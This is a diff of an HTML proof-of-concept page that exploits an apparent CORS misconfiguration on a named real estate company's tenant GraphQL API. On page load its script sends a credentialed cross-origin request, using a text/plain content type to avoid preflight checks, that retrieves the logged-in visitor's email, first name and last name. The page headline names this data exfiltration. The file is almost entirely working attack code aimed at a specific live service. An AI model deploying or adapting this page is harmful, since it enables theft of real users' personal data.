@@ -1,32 +1,27 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CORS Misconfiguration PoC</title>
+</head>
 <body>
-    <h1>CORS Auth Test</h1>
-    <pre id="log"></pre>
+    <h2>Check Console for Data Exfiltration</h2>
     <script>
-        const log = (m) => document.getElementById('log').innerText += m + '\n';
-        
-        async function runPoc() {
-            log("Starting request...");
-            try {
-                const r = await fetch("https://tenant-experience-api.realestate.com.au/graphql", {
-                    method: "POST",
-                    credentials: "include",
-                    headers: {
-                        "Content-Type": "text/plain",
-                        "x-locke-id": "cfb83558-c729-5763-96ed-e5d20f4cf107"
-                    },
-                    body: JSON.stringify({
-                        query: "query { tenantProfile { accountDetails { email } } }"
-                    })
-                });
-                const d = await r.json();
-                log("Response: " + JSON.stringify(d, null, 2));
-            } catch (e) {
-                log("Error: " + e.message);
-            }
-        }
-        runPoc();
+        const target = "https://tenant-experience-api.realestate.com.au/graphql";
+        const query = {"query": "query { tenantProfile { accountDetails { email } personalDetails { firstName lastName } } }"};
+
+        fetch(target, {
+            method: "POST",
+            mode: "cors",
+            credentials: "include",
+            headers: {
+                "Content-Type": "text/plain", // Пытаемся минимизировать Preflight-проверки
+                "x-locke-id": "cfb83558-c729-5763-96ed-e5d20f4cf107"
+            },
+            body: JSON.stringify(query)
+        })
+        .then(r => r.json())
+        .then(data => console.log("Success:", data))
+        .catch(err => console.log("Error:", err));
     </script>
 </body>
 </html>
